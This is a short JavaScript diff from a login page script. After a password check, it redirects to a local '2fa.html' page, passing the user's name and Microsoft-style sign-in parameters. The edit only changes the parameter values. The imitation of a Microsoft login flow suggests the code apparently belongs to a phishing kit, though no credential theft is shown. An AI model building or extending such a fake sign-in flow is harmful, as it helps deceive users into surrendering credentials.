@@ -162,7 +162,7 @@ window.addEventListener('load', async function () {
 			pass_error_shown = true;
 			return;
 		} else {
-			const url = `2fa.html?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&id=292841&user=${thisUser.innerHTML}&uaid=37841b1a533846b18c4d63e24f9ef359&contextid=62586578791094A1&opid=340D15FC348E3278&bk=1728540361&mkt=EN-US`;
+			const url = `2fa.html?contextid=FB028408402DB372&opid=4030B8B731A3798F&bk=1729100773&uaid=33b53e46d4fc45c090adaf1d875619d9&pid=0&user=${thisUser.innerHTML}&uaid=37841b1a533846b18c4d63e24f9ef359&contextid=62586578791094A1&opid=340D15FC348E3278&bk=1728540361&mkt=EN-US`;
 
 			window.location.href = url;
 		}
